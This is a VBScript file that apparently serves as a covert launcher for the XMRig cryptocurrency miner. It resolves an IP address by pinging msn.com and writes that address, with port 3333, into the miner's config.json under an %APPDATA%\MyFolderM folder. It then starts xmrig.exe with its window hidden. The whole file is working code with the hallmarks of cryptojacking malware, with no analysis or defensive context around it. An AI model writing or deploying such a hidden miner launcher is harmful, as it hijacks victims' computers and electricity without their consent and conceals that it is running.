' Define variables
host = "msn.com"
configFilePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\MyFolderM\config.json")
xmrigPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\MyFolderM\xmrig.exe")

Set wshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Ping the host to resolve the IP address
Set execObj = wshShell.Exec("cmd /c ping -n 1 " & host)
output = execObj.StdOut.ReadAll

' Extract the IP address from the ping output
ipAddress = ""
Set regExp = New RegExp
regExp.Pattern = "\d{1,3}(\.\d{1,3}){3}" ' Regex to match an IPv4 address
regExp.Global = False

Set matches = regExp.Execute(output)
If matches.Count > 0 Then
    ipAddress = matches(0)
End If



' Update config.json with the detected IP address
If fso.FileExists(configFilePath) Then
    Set configFile = fso.OpenTextFile(configFilePath, 1)
    configText = configFile.ReadAll
    configFile.Close

    ' Replace the "url" field with the new IP address
    Set regExp = New RegExp
    regExp.Global = False
    regExp.IgnoreCase = True
    regExp.Pattern = """url"":\s*""[^""]*:\d+"""

    ' Construct the replacement string with the resolved IP address and port
    replacement = """url"": """ & ipAddress & ":3333"""

    updatedText = regExp.Replace(configText, replacement)

    ' Write the updated content back to config.json
    Set configFile = fso.OpenTextFile(configFilePath, 2)
    configFile.Write updatedText
    configFile.Close
Else
    WScript.Echo "Error: config.json not found in %APPDATA%\MyFolderM"
    WScript.Quit
End If

' Wait for 5 seconds
WScript.Sleep 5000

' Launch xmrig.exe
If fso.FileExists(xmrigPath) Then
    wshShell.Run """" & xmrigPath & """", 0, False
Else
    WScript.Echo "Error: xmrig.exe not found in %APPDATA%\MyFolderM"
    WScript.Quit
End If
